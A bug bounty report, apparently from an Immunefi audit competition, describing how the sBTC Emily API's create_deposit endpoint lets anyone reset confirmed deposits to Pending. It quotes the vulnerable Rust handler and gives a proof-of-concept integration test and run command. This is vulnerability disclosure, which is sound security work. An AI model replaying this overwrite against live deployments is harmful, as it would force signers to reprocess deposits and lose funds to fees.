# #37777 \[BC-Medium] \`Emily.create\_deposit\` can overwrite any deposit to the Pending state

**Submitted on Dec 15th 2024 at 15:02:14 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #37777
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/emily>
* **Impacts:**
  * Direct loss of funds
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

An attacker can call `Emily.create_deposit` and pass in a Confiered deposit to overwrite the status of the deposit to Pending, thereby causing the Signer to process a deposit repeatedly.

Note that even if the integrity issue with `Emily.create_deposit` is fixed, this issue will still exist, because the issue is not related to integrity, it is about re-creating an already Confiermed deposit.

## Vulnerability Details

The `Emily.create_deposit` code is as follows.

```rust
pub async fn create_deposit(
    context: EmilyContext,
    body: CreateDepositRequestBody,
) -> impl warp::reply::Reply {
    debug!("In create deposit");
    // Internal handler so `?` can be used correctly while still returning a reply.
    async fn handler(
        context: EmilyContext,
        body: CreateDepositRequestBody,
    ) -> Result<impl warp::reply::Reply, Error> {
        // Set variables.
        let api_state = accessors::get_api_state(&context).await?;
        api_state.error_if_reorganizing()?;

        let chaintip = api_state.chaintip();
        let stacks_block_hash: String = chaintip.key.hash;
        let stacks_block_height: u64 = chaintip.key.height;
        let status = Status::Pending;

        // Get parameters from scripts.
        let script_parameters =
            scripts_to_resource_parameters(&body.deposit_script, &body.reclaim_script)?;

        // Make table entry.
        let deposit_entry: DepositEntry = DepositEntry {
            key: DepositEntryKey {
                bitcoin_txid: body.bitcoin_txid,
                bitcoin_tx_output_index: body.bitcoin_tx_output_index,
            },
            recipient: script_parameters.recipient,
            parameters: DepositParametersEntry {
                max_fee: script_parameters.max_fee,
                lock_time: script_parameters.lock_time,
            },
            history: vec![DepositEvent {
                status: StatusEntry::Pending,
                message: "Just received deposit".to_string(),
                stacks_block_hash: stacks_block_hash.clone(),
                stacks_block_height,
            }],
            status,
            last_update_block_hash: stacks_block_hash,
            last_update_height: stacks_block_height,
            amount: script_parameters.amount,
            reclaim_script: body.reclaim_script,
            deposit_script: body.deposit_script,
            ..Default::default()
        };
        // Validate deposit entry.
        deposit_entry.validate()?;
        // Add entry to the table.
        accessors::add_deposit_entry(&context, &deposit_entry).await?;
        // Respond.
        let response: Deposit = deposit_entry.try_into()?;
        Ok(with_status(json(&response), StatusCode::CREATED))
    }
    // Handle and respond.
    handler(context, body)
        .await
        .map_or_else(Reply::into_response, Reply::into_response)
}
```

It will insert the deposit into the table in the Pending state. It will not check whether the deposit already exists. Therefore, if the deposit has been Confiermed, it will be overwritten as Pending.

## Impact Details

The signer will pull all pending deposits from Emily for processing each time. If an attacker overwrites the status of all historical deposits to pending, the signer will reprocess all deposits at once. This may make it difficult for the signer to handle so many deposits. In addition, these deposits will be submitted to the Stacks chain (which will fail to execute), and the signer may lose a lot of gas fees. The signer may also be unable to submit a new deposit due to insufficient gas fees.

## References

None

## Proof of Concept

## Proof of Concept

1. Add this test case to `emily/handler/tests/integration/deposit.rs`

   ```diff
   --- a/emily/handler/tests/integration/deposit.rs
   +++ b/emily/handler/tests/integration/deposit.rs
   @@ -456,6 +456,126 @@ async fn update_deposits() {
        assert_eq!(expected_deposits, updated_deposits);
    }

   +#[cfg_attr(not(feature = "integration-tests"), ignore)]
   +#[tokio::test]
   +async fn poc_recreate_deposit_after_update_deposit() {
   +    // 👇👇👇👇👇👇👇👇👇👇 copy from `update_deposits` 👇👇👇👇👇👇👇👇👇👇
   +    let configuration = clean_setup().await;
   +
   +    // Arrange.
   +    // --------
   +    let bitcoin_txids: Vec<&str> = vec!["bitcoin_txid_1", "bitcoin_txid_2"];
   +    let bitcoin_tx_output_indices = vec![1, 2];
   +
   +    // Setup test deposit transaction.
   +    let DepositTxnData {
   +        recipient: expected_recipient,
   +        reclaim_script,
   +        deposit_script,
   +    } = DepositTxnData::new(DEPOSIT_LOCK_TIME, DEPOSIT_MAX_FEE, DEPOSIT_AMOUNT_SATS);
   +
   +    let update_status_message: &str = "test_status_message";
   +    let update_block_hash: &str = "update_block_hash";
   +    let update_block_height: u64 = 34;
   +    let update_status: Status = Status::Confirmed;
   +
   +    let update_fulfillment: Fulfillment = Fulfillment {
   +        bitcoin_block_hash: "bitcoin_block_hash".to_string(),
   +        bitcoin_block_height: 23,
   +        bitcoin_tx_index: 45,
   +        bitcoin_txid: "test_fulfillment_bitcoin_txid".to_string(),
   +        btc_fee: 2314,
   +        stacks_txid: "test_fulfillment_stacks_txid".to_string(),
   +    };
   +
   +    let num_deposits = bitcoin_tx_output_indices.len() * bitcoin_txids.len();
   +    let mut create_requests: Vec<CreateDepositRequestBody> = Vec::with_capacity(num_deposits);
   +    let mut deposit_updates: Vec<DepositUpdate> = Vec::with_capacity(num_deposits);
   +    let mut expected_deposits: Vec<Deposit> = Vec::with_capacity(num_deposits);
   +    for bitcoin_txid in bitcoin_txids {
   +        for &bitcoin_tx_output_index in bitcoin_tx_output_indices.iter() {
   +            let create_request = CreateDepositRequestBody {
   +                bitcoin_tx_output_index,
   +                bitcoin_txid: bitcoin_txid.into(),
   +                deposit_script: deposit_script.clone(),
   +                reclaim_script: reclaim_script.clone(),
   +            };
   +            create_requests.push(create_request);
   +
   +            let deposit_update = DepositUpdate {
   +                bitcoin_tx_output_index: bitcoin_tx_output_index,
   +                bitcoin_txid: bitcoin_txid.into(),
   +                fulfillment: Some(Some(Box::new(update_fulfillment.clone()))),
   +                last_update_block_hash: update_block_hash.into(),
   +                last_update_height: update_block_height,
   +                status: update_status.clone(),
   +                status_message: update_status_message.into(),
   +            };
   +            deposit_updates.push(deposit_update);
   +
   +            let expected_deposit = Deposit {
   +                amount: DEPOSIT_AMOUNT_SATS,
   +                bitcoin_tx_output_index,
   +                bitcoin_txid: bitcoin_txid.into(),
   +                fulfillment: Some(Some(Box::new(update_fulfillment.clone()))),
   +                last_update_block_hash: update_block_hash.into(),
   +                last_update_height: update_block_height,
   +                reclaim_script: reclaim_script.clone(),
   +                deposit_script: deposit_script.clone(),
   +                parameters: Box::new(DepositParameters {
   +                    lock_time: DEPOSIT_LOCK_TIME,
   +                    max_fee: DEPOSIT_MAX_FEE,
   +                }),
   +                recipient: expected_recipient.clone(),
   +                status: update_status.clone(),
   +                status_message: update_status_message.into(),
   +            };
   +            expected_deposits.push(expected_deposit);
   +        }
   +    }
   +
   +    // Create the deposits here.
   +    let update_request = UpdateDepositsRequestBody { deposits: deposit_updates };
   +
   +    // Act.
   +    // ----
   +    let create_requests_clone = create_requests.clone();
   +    batch_create_deposits(&configuration, create_requests).await;
   +    let update_deposits_response =
   +        apis::deposit_api::update_deposits(&configuration, update_request)
   +            .await
   +            .expect("Received an error after making a valid update deposits api call.");
   +
   +    // Assert.
   +    // -------
   +    let mut updated_deposits = update_deposits_response.deposits;
   +    updated_deposits.sort_by(arbitrary_deposit_partial_cmp);
   +    expected_deposits.sort_by(arbitrary_deposit_partial_cmp);
   +    assert_eq!(expected_deposits, updated_deposits);
   +    // 👆👆👆👆👆👆👆👆👆👆 copy from `update_deposits` 👆👆👆👆👆👆👆👆👆👆
   +
   +    // PoC.1: check Pending deposit amount before re-create, is 0
   +    let response = apis::deposit_api::get_deposits(
   +        &configuration,
   +        emily_client::models::Status::Pending,
   +        None,
   +        None,
   +    ).await.unwrap();
   +    assert_eq!(response.deposits.len(), 0);
   +
   +    // PoC.2: re-create deposits
   +    batch_create_deposits(&configuration, create_requests_clone).await;
   +
   +    // PoC.3: check Pending deposit amount before re-create, is not 0
   +    let response = apis::deposit_api::get_deposits(
   +        &configuration,
   +        emily_client::models::Status::Pending,
   +        None,
   +        None,
   +    ).await.unwrap();
   +    assert_ne!(response.deposits.len(), 0);
   +}
   +
    #[cfg_attr(not(feature = "integration-tests"), ignore)]
    #[tokio::test]
    async fn update_deposits_updates_chainstate() {
   ```
2. Run the test case

   ```sh
   cargo test --package emily-handler --test integration -- deposit::poc_recreate_deposit_after_update_deposit --exact --show-output --ignored
   ```
